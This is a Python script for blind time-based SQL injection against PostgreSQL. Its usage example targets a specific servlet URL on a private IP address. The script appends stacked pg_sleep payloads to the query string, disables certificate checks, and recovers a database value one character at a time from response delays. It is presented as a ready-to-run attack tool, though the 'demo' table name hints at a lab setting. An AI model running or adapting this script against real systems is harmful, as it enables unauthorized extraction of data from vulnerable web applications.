#!/usr/bin/env python3
"""
Blind time‑based SQLi enumerator (PostgreSQL)

Usage:
    python Blind-SQLI-Time.py "https://192.168.106.113:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1"
"""
import sys, time, requests, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DELAY     = 2.0              # pg_sleep seconds on a match
THRESHOLD = DELAY * 0.9      # ≥ 1.8 s == hit
CHARS     = [chr(i) for i in range(32, 127)]   # printable ASCII

def payload(prefix: str, ch: str) -> str:
    trial  = prefix + ch
    length = len(trial)
    return (
        f"SELECT pg_sleep({int(DELAY)}) "
        f"WHERE EXISTS("
        f"SELECT 1 FROM demo "
        f"WHERE lower(left(t,{length}))=$${trial}$$"
        f");-- /"
    )

def main() -> None:
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <base_uri>")
        sys.exit(1)

    base_uri = sys.argv[1].rstrip("?&")
    extracted = ""

    print("[*] Starting blind SQL‑i enum")
    print(f"[*] Base URI        : {base_uri}")
    print(f"[*] Delay threshold : {THRESHOLD:.2f}s\n")

    while True:
        found = False
        for ch in CHARS:
            sql = payload(extracted, ch)
            url = f"{base_uri};{sql}"

            print(f"[DEBUG] Trying '{extracted + ch}'")
            start = time.time()
            try:
                r = requests.get(url, verify=False, timeout=10)
                status = r.status_code
            except requests.RequestException as e:
                status = None
                print(f"[WARNING] Request error: {e}")
            elapsed = time.time() - start
            print(f"[DEBUG]  -> status {status}, {elapsed:.3f}s")

            if elapsed >= THRESHOLD:
                extracted += ch
                print(f"[+] Match! prefix now: '{extracted}'\n")
                found = True
                break

        if not found:
            print("[*] No further match – enumeration finished.\n")
            break

    print(f"[+] Final extracted value: '{extracted}'")

if __name__ == "__main__":
    main()
